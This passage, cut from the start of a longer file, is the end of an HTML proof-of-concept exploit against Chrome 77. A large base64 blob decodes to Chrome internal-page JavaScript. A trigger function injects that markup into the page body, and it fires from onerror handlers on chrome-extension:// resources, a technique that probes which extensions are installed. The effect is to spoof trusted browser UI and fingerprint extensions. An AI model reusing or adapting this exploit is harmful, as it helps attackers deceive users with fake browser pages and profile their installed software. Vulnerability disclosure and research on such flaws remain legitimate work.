yb21lU2VuZFJlc29sdmVyTWFwW2lkXTsNCiAgICBkZWxldGUgY2hyb21lU2VuZFJlc29sdmVyTWFwW2lkXTsNCg0KICAgIGlmIChpc1N1Y2Nlc3MpIHsNCiAgICAgIHJlc29sdmVyLnJlc29sdmUocmVzcG9uc2UpOw0KICAgIH0gZWxzZSB7DQogICAgICByZXNvbHZlci5yZWplY3QocmVzcG9uc2UpOw0KICAgIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIHNlbmRXaXRoUHJvbWlzZShtZXRob2ROYW1lLCB2YXJfYXJncykgew0KICAgIGNvbnN0IGFyZ3MgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMsIDEpOw0KICAgIGNvbnN0IHByb21pc2VSZXNvbHZlciA9IG5ldyBQcm9taXNlUmVzb2x2ZXIoKTsNCiAgICBjb25zdCBpZCA9IG1ldGhvZE5hbWUgKyAnXycgKyBjcmVhdGVVaWQoKTsNCiAgICBjaHJvbWVTZW5kUmVzb2x2ZXJNYXBbaWRdID0gcHJvbWlzZVJlc29sdmVyOw0KICAgIGNocm9tZS5zZW5kKG1ldGhvZE5hbWUsIFtpZF0uY29uY2F0KGFyZ3MpKTsNCiAgICByZXR1cm4gcHJvbWlzZVJlc29sdmVyLnByb21pc2U7DQogIH0NCg0KICBjb25zdCB3ZWJVSUxpc3RlbmVyTWFwID0ge307DQoNCg0KICBmdW5jdGlvbiB3ZWJVSUxpc3RlbmVyQ2FsbGJhY2soZXZlbnQsIHZhcl9hcmdzKSB7DQogICAgY29uc3QgZXZlbnRMaXN0ZW5lcnNNYXAgPSB3ZWJVSUxpc3RlbmVyTWFwW2V2ZW50XTsNCiAgICBpZiAoIWV2ZW50TGlzdGVuZXJzTWFwKSB7DQogICAgICByZXR1cm47DQogICAgfQ0KDQogICAgY29uc3QgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywgMSk7DQogICAgZm9yIChjb25zdCBsaXN0ZW5lcklkIGluIGV2ZW50TGlzdGVuZXJzTWFwKSB7DQogICAgICBldmVudExpc3RlbmVyc01hcFtsaXN0ZW5lcklkXS5hcHBseShudWxsLCBhcmdzKTsNCiAgICB9DQogIH0NCg0KICBmdW5jdGlvbiBhZGRXZWJVSUxpc3RlbmVyKGV2ZW50TmFtZSwgY2FsbGJhY2spIHsNCiAgICB3ZWJVSUxpc3RlbmVyTWFwW2V2ZW50TmFtZV0gPSB3ZWJVSUxpc3RlbmVyTWFwW2V2ZW50TmFtZV0gfHwge307DQogICAgY29uc3QgdWlkID0gY3JlYXRlVWlkKCk7DQogICAgd2ViVUlMaXN0ZW5lck1hcFtldmVudE5hbWVdW3VpZF0gPSBjYWxsYmFjazsNCiAgICByZXR1cm4ge2V2ZW50TmFtZTogZXZlbnROYW1lLCB1aWQ6IHVpZH07DQogIH0NCg0KICBmdW5jdGlvbiByZW1vdmVXZWJVSUxpc3RlbmVyKGxpc3RlbmVyKSB7DQogICAgY29uc3QgbGlzdGVuZXJFeGlzdHMgPSB3ZWJVSUxpc3RlbmVyTWFwW2xpc3RlbmVyLmV2ZW50TmFtZV0gJiYNCiAgICAgICAgd2ViVUlMaXN0ZW5lck1hcFtsaXN0ZW5lci5ldmVudE5hbWVdW2xpc3RlbmVyLnVpZF07DQogICAgaWYgKGxpc3RlbmVyRXhpc3RzKSB7DQogICAgICBkZWxldGUgd2ViVUlMaXN0ZW5lck1hcFtsaXN0ZW5lci5ldmVudE5hbWVdW2xpc3RlbmVyLnVpZF07DQogICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KICB9DQoNCiAgcmV0dXJuIHsNCiAgICBhZGRTaW5nbGV0b25HZXR0ZXI6IGFkZFNpbmdsZXRvbkdldHRlciwNCiAgICBkZWZpbmU6IGRlZmluZSwNCiAgICBkZWZpbmVQcm9wZXJ0eTogZGVmaW5lUHJvcGVydHksDQogICAgZGlzcGF0Y2hQcm9wZXJ0eUNoYW5nZTogZGlzcGF0Y2hQcm9wZXJ0eUNoYW5nZSwNCiAgICBkaXNwYXRjaFNpbXBsZUV2ZW50OiBkaXNwYXRjaFNpbXBsZUV2ZW50LA0KICAgIGV4cG9ydFBhdGg6IGV4cG9ydFBhdGgsDQogICAgUHJvcGVydHlLaW5kOiBQcm9wZXJ0eUtpbmQsDQoNCiAgICBhZGRXZWJVSUxpc3RlbmVyOiBhZGRXZWJVSUxpc3RlbmVyLA0KICAgIHJlbW92ZVdlYlVJTGlzdGVuZXI6IHJlbW92ZVdlYlVJTGlzdGVuZXIsDQogICAgc2VuZFdpdGhQcm9taXNlOiBzZW5kV2l0aFByb21pc2UsDQogICAgd2ViVUlMaXN0ZW5lckNhbGxiYWNrOiB3ZWJVSUxpc3RlbmVyQ2FsbGJhY2ssDQogICAgd2ViVUlSZXNwb25zZTogd2ViVUlSZXNwb25zZSwNCg0KICAgIGdldCBkb2MoKSB7DQogICAgICByZXR1cm4gZG9jdW1lbnQ7DQogICAgfSwNCg0KICAgIGdldCBpc01hYygpIHsNCiAgICAgIHJldHVybiAvTWFjLy50ZXN0KG5hdmlnYXRvci5wbGF0Zm9ybSk7DQogICAgfSwNCg0KICAgIGdldCBpc1dpbmRvd3MoKSB7DQogICAgICByZXR1cm4gL1dpbi8udGVzdChuYXZpZ2F0b3IucGxhdGZvcm0pOw0KICAgIH0sDQogICAgZ2V0IGlzQ2hyb21lT1MoKSB7DQogICAgICByZXR1cm4gL0NyT1MvLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCk7DQogICAgfSwNCg0KICAgIGdldCBpc0xpbnV4KCkgew0KICAgICAgcmV0dXJuIC9MaW51eC8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsNCiAgICB9LA0KDQogICAgZ2V0IGlzQW5kcm9pZCgpIHsNCiAgICAgIHJldHVybiAvQW5kcm9pZC8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsNCiAgICB9LA0KDQogICAgZ2V0IGlzSU9TKCkgew0KICAgICAgcmV0dXJuIC9pUGFkfGlQaG9uZXxpUG9kLy50ZXN0KG5hdmlnYXRvci5wbGF0Zm9ybSk7DQogICAgfQ0KICB9Ow0KfSh0aGlzKTsNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBhc3NlcnQoY29uZGl0aW9uLCBvcHRfbWVzc2FnZSkgew0KICBpZiAoIWNvbmRpdGlvbikgew0KICAgIGxldCBtZXNzYWdlID0gJ0Fzc2VydGlvbiBmYWlsZWQnOw0KICAgIGlmIChvcHRfbWVzc2FnZSkgew0KICAgICAgbWVzc2FnZSA9IG1lc3NhZ2UgKyAnOiAnICsgb3B0X21lc3NhZ2U7DQogICAgfQ0KICAgIGNvbnN0IGVycm9yID0gbmV3IEVycm9yKG1lc3NhZ2UpOw0KICAgIGNvbnN0IGdsb2JhbCA9IGZ1bmN0aW9uKCkgew0KICAgICAgY29uc3QgdGhpc09yU2VsZiA9IHRoaXMgfHwgc2VsZjsNCiAgICAgIC8qKiBAdHlwZSB7Ym9vbGVhbn0gKi8NCiAgICAgIHRoaXNPclNlbGYudHJhY2VBc3NlcnRpb25zRm9yVGVzdGluZzsNCiAgICAgIHJldHVybiB0aGlzT3JTZWxmOw0KICAgIH0oKTsNCiAgICBpZiAoZ2xvYmFsLnRyYWNlQXNzZXJ0aW9uc0ZvclRlc3RpbmcpIHsNCiAgICAgIGNvbnNvbGUud2FybihlcnJvci5zdGFjayk7DQogICAgfQ0KICAgIHRocm93IGVycm9yOw0KICB9DQogIHJldHVybiBjb25kaXRpb247DQp9DQoNCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBhc3NlcnROb3RSZWFjaGVkKG9wdF9tZXNzYWdlKSB7DQogIGFzc2VydChmYWxzZSwgb3B0X21lc3NhZ2UgfHwgJ1VucmVhY2hhYmxlIGNvZGUgaGl0Jyk7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gYXNzZXJ0SW5zdGFuY2VvZih2YWx1ZSwgdHlwZSwgb3B0X21lc3NhZ2UpIHsNCg0KICBpZiAoISh2YWx1ZSBpbnN0YW5jZW9mIHR5cGUpKSB7DQogICAgYXNzZXJ0Tm90UmVhY2hlZCgNCiAgICAgICAgb3B0X21lc3NhZ2UgfHwNCiAgICAgICAgJ1ZhbHVlICcgKyB2YWx1ZSArICcgaXMgbm90IGFbbl0gJyArICh0eXBlLm5hbWUgfHwgdHlwZW9mIHR5cGUpKTsNCiAgfQ0KICByZXR1cm4gdmFsdWU7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gJChpZCkgew0KICBjb25zdCBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTsNCiAgcmV0dXJuIGVsID8gYXNzZXJ0SW5zdGFuY2VvZihlbCwgSFRNTEVsZW1lbnQpIDogbnVsbDsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBnZXRTVkdFbGVtZW50KGlkKSB7DQogIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpOw0KICByZXR1cm4gZWwgPyBhc3NlcnRJbnN0YW5jZW9mKGVsLCBFbGVtZW50KSA6IG51bGw7DQp9DQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGdldERlZXBBY3RpdmVFbGVtZW50KCkgew0KICBsZXQgYSA9IGRvY3VtZW50LmFjdGl2ZUVsZW1lbnQ7DQogIHdoaWxlIChhICYmIGEuc2hhZG93Um9vdCAmJiBhLnNoYWRvd1Jvb3QuYWN0aXZlRWxlbWVudCkgew0KICAgIGEgPSBhLnNoYWRvd1Jvb3QuYWN0aXZlRWxlbWVudDsNCiAgfQ0KICByZXR1cm4gYTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBwYXJzZVF1ZXJ5UGFyYW1zKGxvY2F0aW9uKSB7DQogIGNvbnN0IHBhcmFtcyA9IHt9Ow0KICBjb25zdCBxdWVyeSA9IHVuZXNjYXBlKGxvY2F0aW9uLnNlYXJjaC5zdWJzdHJpbmcoMSkpOw0KICBjb25zdCB2YXJzID0gcXVlcnkuc3BsaXQoJyYnKTsNCiAgZm9yIChsZXQgaSA9IDA7IGkgPCB2YXJzLmxlbmd0aDsgaSsrKSB7DQogICAgY29uc3QgcGFpciA9IHZhcnNbaV0uc3BsaXQoJz0nKTsNCiAgICBwYXJhbXNbcGFpclswXV0gPSBwYWlyWzFdOw0KICB9DQogIHJldHVybiBwYXJhbXM7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gc2V0UXVlcnlQYXJhbShsb2NhdGlvbiwga2V5LCB2YWx1ZSkgew0KICBjb25zdCBxdWVyeSA9IHBhcnNlUXVlcnlQYXJhbXMobG9jYXRpb24pOw0KICBxdWVyeVtlbmNvZGVVUklDb21wb25lbnQoa2V5KV0gPSBlbmNvZGVVUklDb21wb25lbnQodmFsdWUpOw0KDQogIGxldCBuZXdRdWVyeSA9ICcnOw0KICBmb3IgKGNvbnN0IHEgaW4gcXVlcnkpIHsNCiAgICBuZXdRdWVyeSArPSAobmV3UXVlcnkgPyAnJicgOiAnPycpICsgcSArICc9JyArIHF1ZXJ5W3FdOw0KICB9DQoNCiAgcmV0dXJuIGxvY2F0aW9uLm9yaWdpbiArIGxvY2F0aW9uLnBhdGhuYW1lICsgbmV3UXVlcnkgKyBsb2NhdGlvbi5oYXNoOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGZpbmRBbmNlc3RvckJ5Q2xhc3MoZWwsIGNsYXNzTmFtZSkgew0KICByZXR1cm4gLyoqIEB0eXBlIHtFbGVtZW50fSAqLyAoZmluZEFuY2VzdG9yKGVsLCBmdW5jdGlvbihlbCkgew0KICAgIHJldHVybiBlbC5jbGFzc0xpc3QgJiYgZWwuY2xhc3NMaXN0LmNvbnRhaW5zKGNsYXNzTmFtZSk7DQogIH0pKTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBmaW5kQW5jZXN0b3Iobm9kZSwgcHJlZGljYXRlKSB7DQogIGxldCBsYXN0ID0gZmFsc2U7DQogIHdoaWxlIChub2RlICE9IG51bGwgJiYgIShsYXN0ID0gcHJlZGljYXRlKG5vZGUpKSkgew0KICAgIG5vZGUgPSBub2RlLnBhcmVudE5vZGU7DQogIH0NCiAgcmV0dXJuIGxhc3QgPyBub2RlIDogbnVsbDsNCn0NCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gZGlzYWJsZVRleHRTZWxlY3RBbmREcmFnKA0KICAgIG9wdF9hbGxvd1NlbGVjdFN0YXJ0LCBvcHRfYWxsb3dEcmFnU3RhcnQpIHsNCiAgZG9jdW1lbnQub25zZWxlY3RzdGFydCA9IGZ1bmN0aW9uKGUpIHsNCiAgICBpZiAoIShvcHRfYWxsb3dTZWxlY3RTdGFydCAmJiBvcHRfYWxsb3dTZWxlY3RTdGFydC5jYWxsKHRoaXMsIGUpKSkgew0KICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIH0NCiAgfTsNCiAgZG9jdW1lbnQub25kcmFnc3RhcnQgPSBmdW5jdGlvbihlKSB7DQogICAgaWYgKCEob3B0X2FsbG93RHJhZ1N0YXJ0ICYmIG9wdF9hbGxvd0RyYWdTdGFydC5jYWxsKHRoaXMsIGUpKSkgew0KICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIH0NCiAgfTsNCn0NCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gaXNSVEwoKSB7DQogIHJldHVybiBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuZGlyID09ICdydGwnOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGdldFJlcXVpcmVkRWxlbWVudChpZCkgew0KICByZXR1cm4gYXNzZXJ0SW5zdGFuY2VvZigNCiAgICAgICQoaWQpLCBIVE1MRWxlbWVudCwgJ01pc3NpbmcgcmVxdWlyZWQgZWxlbWVudDogJyArIGlkKTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBxdWVyeVJlcXVpcmVkRWxlbWVudChzZWxlY3RvcnMsIG9wdF9jb250ZXh0KSB7DQogIGNvbnN0IGVsZW1lbnQgPSAob3B0X2NvbnRleHQgfHwgZG9jdW1lbnQpLnF1ZXJ5U2VsZWN0b3Ioc2VsZWN0b3JzKTsNCiAgcmV0dXJuIGFzc2VydEluc3RhbmNlb2YoDQogICAgICBlbGVtZW50LCBIVE1MRWxlbWVudCwgJ01pc3NpbmcgcmVxdWlyZWQgZWxlbWVudDogJyArIHNlbGVjdG9ycyk7DQp9DQoNClsnY2xpY2snLCAnYXV4Y2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uKGV2ZW50TmFtZSkgew0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKGV2ZW50TmFtZSwgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmJ1dHRvbiA+IDEpIHsNCiAgICAgIHJldHVybjsNCiAgICB9IA0KICAgIGlmIChlLmRlZmF1bHRQcmV2ZW50ZWQpIHsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBjb25zdCBldmVudFBhdGggPSBlLnBhdGg7DQogICAgbGV0IGFuY2hvciA9IG51bGw7DQogICAgaWYgKGV2ZW50UGF0aCkgew0KICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBldmVudFBhdGgubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgY29uc3QgZWxlbWVudCA9IGV2ZW50UGF0aFtpXTsNCiAgICAgICAgaWYgKGVsZW1lbnQudGFnTmFtZSA9PT0gJ0EnICYmIGVsZW1lbnQuaHJlZikgew0KICAgICAgICAgIGFuY2hvciA9IGVsZW1lbnQ7DQogICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQoNCiAgICBsZXQgZWwgPSBlLnRhcmdldDsNCiAgICBpZiAoIWFuY2hvciAmJiBlbC5ub2RlVHlwZSA9PSBOb2RlLkVMRU1FTlRfTk9ERSAmJg0KICAgICAgICBlbC53ZWJraXRNYXRjaGVzU2VsZWN0b3IoJ0EsIEEgKicpKSB7DQogICAgICB3aGlsZSAoZWwudGFnTmFtZSAhPSAnQScpIHsNCiAgICAgICAgZWwgPSBlbC5wYXJlbnRFbGVtZW50Ow0KICAgICAgfQ0KICAgICAgYW5jaG9yID0gZWw7DQogICAgfQ0KDQogICAgaWYgKCFhbmNob3IpIHsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBhbmNob3IgPSAoYW5jaG9yKTsNCiAgICBpZiAoKGFuY2hvci5wcm90b2NvbCA9PSAnZmlsZTonIHx8IGFuY2hvci5wcm90b2NvbCA9PSAnYWJvdXQ6JykgJiYNCiAgICAgICAgKGUuYnV0dG9uID09IDAgfHwgZS5idXR0b24gPT0gMSkpIHsNCiAgICAgIGNocm9tZS5zZW5kKCduYXZpZ2F0ZVRvVXJsJywgWw0KICAgICAgICBhbmNob3IuaHJlZiwgYW5jaG9yLnRhcmdldCwgZS5idXR0b24sIGUuYWx0S2V5LCBlLmN0cmxLZXksIGUubWV0YUtleSwNCiAgICAgICAgZS5zaGlmdEtleQ0KICAgICAgXSk7DQogICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgfQ0KICB9KTsNCn0pOw0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGFwcGVuZFBhcmFtKHVybCwga2V5LCB2YWx1ZSkgew0KICBjb25zdCBwYXJhbSA9IGVuY29kZVVSSUNvbXBvbmVudChrZXkpICsgJz0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHZhbHVlKTsNCg0KICBpZiAodXJsLmluZGV4T2YoJz8nKSA9PSAtMSkgew0KICAgIHJldHVybiB1cmwgKyAnPycgKyBwYXJhbTsNCiAgfQ0KICByZXR1cm4gdXJsICsgJyYnICsgcGFyYW07DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gY3JlYXRlRWxlbWVudFdpdGhDbGFzc05hbWUodHlwZSwgY2xhc3NOYW1lKSB7DQogIGNvbnN0IGVsbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQodHlwZSk7DQogIGVsbS5jbGFzc05hbWUgPSBjbGFzc05hbWU7DQogIHJldHVybiBlbG07DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gZW5zdXJlVHJhbnNpdGlvbkVuZEV2ZW50KGVsLCBvcHRfdGltZU91dCkgew0KICBpZiAob3B0X3RpbWVPdXQgPT09IHVuZGVmaW5lZCkgew0KICAgIGNvbnN0IHN0eWxlID0gZ2V0Q29tcHV0ZWRTdHlsZShlbCk7DQogICAgb3B0X3RpbWVPdXQgPSBwYXJzZUZsb2F0KHN0eWxlLnRyYW5zaXRpb25EdXJhdGlvbikgKiAxMDAwOw0KICAgIG9wdF90aW1lT3V0ICs9IDUwOw0KICB9DQoNCiAgbGV0IGZpcmVkID0gZmFsc2U7DQogIGVsLmFkZEV2ZW50TGlzdGVuZXIoJ3RyYW5zaXRpb25lbmQnLCBmdW5jdGlvbiBmKGUpIHsNCiAgICBlbC5yZW1vdmVFdmVudExpc3RlbmVyKCd0cmFuc2l0aW9uZW5kJywgZik7DQogICAgZmlyZWQgPSB0cnVlOw0KICB9KTsNCiAgd2luZG93LnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7DQogICAgaWYgKCFmaXJlZCkgew0KICAgICAgY3IuZGlzcGF0Y2hTaW1wbGVFdmVudChlbCwgJ3RyYW5zaXRpb25lbmQnLCB0cnVlKTsNCiAgICB9DQogIH0sIG9wdF90aW1lT3V0KTsNCn0NCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gc2Nyb2xsVG9wRm9yRG9jdW1lbnQoZG9jKSB7DQogIHJldHVybiBkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbFRvcCB8fCBkb2MuYm9keS5zY3JvbGxUb3A7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gc2V0U2Nyb2xsVG9wRm9yRG9jdW1lbnQoZG9jLCB2YWx1ZSkgew0KICBkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbFRvcCA9IGRvYy5ib2R5LnNjcm9sbFRvcCA9IHZhbHVlOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIHNjcm9sbExlZnRGb3JEb2N1bWVudChkb2MpIHsNCiAgcmV0dXJuIGRvYy5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsTGVmdCB8fCBkb2MuYm9keS5zY3JvbGxMZWZ0Ow0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIHNldFNjcm9sbExlZnRGb3JEb2N1bWVudChkb2MsIHZhbHVlKSB7DQogIGRvYy5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsTGVmdCA9IGRvYy5ib2R5LnNjcm9sbExlZnQgPSB2YWx1ZTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBIVE1MRXNjYXBlKG9yaWdpbmFsKSB7DQogIHJldHVybiBvcmlnaW5hbC5yZXBsYWNlKC8mL2csICcmYW1wOycpDQogICAgICAucmVwbGFjZSgvPC9nLCAnJmx0OycpDQogICAgICAucmVwbGFjZSgvPi9nLCAnJmd0OycpDQogICAgICAucmVwbGFjZSgvIi9nLCAnJnF1b3Q7JykNCiAgICAgIC5yZXBsYWNlKC8nL2csICcmIzM5OycpOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGVsaWRlKG9yaWdpbmFsLCBtYXhMZW5ndGgpIHsNCiAgaWYgKG9yaWdpbmFsLmxlbmd0aCA8PSBtYXhMZW5ndGgpIHsNCiAgICByZXR1cm4gb3JpZ2luYWw7DQogIH0NCiAgcmV0dXJuIG9yaWdpbmFsLnN1YnN0cmluZygwLCBtYXhMZW5ndGggLSAxKSArICdcdTIwMjYnOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIHF1b3RlU3RyaW5nKHN0cikgew0KICByZXR1cm4gc3RyLnJlcGxhY2UoLyhbXFxcLlwrXCpcP1xbXF5cXVwkXChcKVx7XH1cPVwhXDxcPlx8XDpdKS9nLCAnXFwkMScpOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGxpc3Rlbk9uY2UodGFyZ2V0LCBldmVudE5hbWVzLCBjYWxsYmFjaykgew0KICBpZiAoIUFycmF5LmlzQXJyYXkoZXZlbnROYW1lcykpIHsNCiAgICBldmVudE5hbWVzID0gZXZlbnROYW1lcy5zcGxpdCgvICsvKTsNCiAgfQ0KDQogIGNvbnN0IHJlbW92ZUFsbEFuZENhbGxDYWxsYmFjayA9IGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgZXZlbnROYW1lcy5mb3JFYWNoKGZ1bmN0aW9uKGV2ZW50TmFtZSkgew0KICAgICAgdGFyZ2V0LnJlbW92ZUV2ZW50TGlzdGVuZXIoZXZlbnROYW1lLCByZW1vdmVBbGxBbmRDYWxsQ2FsbGJhY2ssIGZhbHNlKTsNCiAgICB9KTsNCiAgICByZXR1cm4gY2FsbGJhY2soZXZlbnQpOw0KICB9Ow0KDQogIGV2ZW50TmFtZXMuZm9yRWFjaChmdW5jdGlvbihldmVudE5hbWUpIHsNCiAgICB0YXJnZXQuYWRkRXZlbnRMaXN0ZW5lcihldmVudE5hbWUsIHJlbW92ZUFsbEFuZENhbGxDYWxsYmFjaywgZmFsc2UpOw0KICB9KTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBoYXNLZXlNb2RpZmllcnMoZSkgew0KICByZXR1cm4gISEoZS5hbHRLZXkgfHwgZS5jdHJsS2V5IHx8IGUubWV0YUtleSB8fCBlLnNoaWZ0S2V5KTsNCn0NCg0KZnVuY3Rpb24gaXNUZXh0SW5wdXRFbGVtZW50KGVsKSB7DQogIHJldHVybiBlbC50YWdOYW1lID09ICdJTlBVVCcgfHwgZWwudGFnTmFtZSA9PSAnVEVYVEFSRUEnOw0KfQ0KPC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+"; // base64 encoded html content
	x=document.body.innerHTML=atob(content);
}
</script>
<!-- Using Google Docs Offline Extension -->
<script src="chrome-extension://ghbmnnjooekpmoecnnnilnnbdlolhkhi/page_embed_script.js" onerror="trigger();"></script>
<!-- Using Chrome Media Router (Chromecast™) Extension
<script src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_sender.js" onerror="trigger();"></script>
<script src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/cast_app.js" onerror="trigger();"></script>
<img src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/chromecast_logo_grey.png" onerror="trigger();">
-->
</body>
</html>

<!-- Proof-of-concept (POC) works on latest version 77.0.3865.90 (Official Build) (64-bit) -->